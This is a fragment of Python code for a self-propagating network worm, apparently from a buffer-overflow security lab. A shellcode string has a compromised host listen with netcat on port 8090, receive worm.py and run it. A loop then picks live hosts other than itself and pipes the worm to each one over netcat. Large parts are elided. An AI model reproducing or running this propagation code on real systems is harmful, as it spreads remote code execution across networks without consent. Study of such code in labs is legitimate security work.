...
shellcode= (
   ...
   " test -f /bof/worm.py && echo 'asee' || { "
   " nc -lnv 8090 > worm.py; python3 worm.py;};             *"
...
while True:
    ...
    while True:
        ...
        if targetIP == socket.gethostbyname(socket.gethostname()):
            continue
        if isAlive(targetIP):
            break
    ...
    time.sleep(5)
    subprocess.run([f"cat worm.py | nc -w7 {targetIP} 8090"], shell=True)    
